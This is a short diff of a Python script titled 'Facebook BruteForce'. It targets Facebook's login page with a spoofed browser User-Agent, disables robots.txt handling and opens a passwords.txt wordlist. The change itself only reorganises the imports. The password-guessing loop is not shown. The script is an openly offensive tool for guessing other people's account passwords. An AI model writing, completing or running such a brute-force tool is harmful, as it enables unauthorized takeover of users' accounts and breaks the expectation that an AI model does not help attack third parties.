@@ -1,19 +1,18 @@
 import time
 import sys
+import mechanize
+import urllib2
 
 post_url='https://www.facebook.com/login.php'
 headers = {
 	'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
 }
+import mechanize
+import urllib2
+browser = mechanize.Browser()
+browser.addheaders = [('User-Agent',headers['User-Agent'])]
+browser.set_handle_robots(False)
 
-try:
-	import mechanize
-	import urllib2
-	browser = mechanize.Browser()
-	browser.addheaders = [('User-Agent',headers['User-Agent'])]
-	browser.set_handle_robots(False)
-except:
-	print('\n\tPlease install mechanize.\n')
 	
 print('\n---------- Welcome To Facebook BruteForce ----------\n')
 file=open('passwords.txt','r')
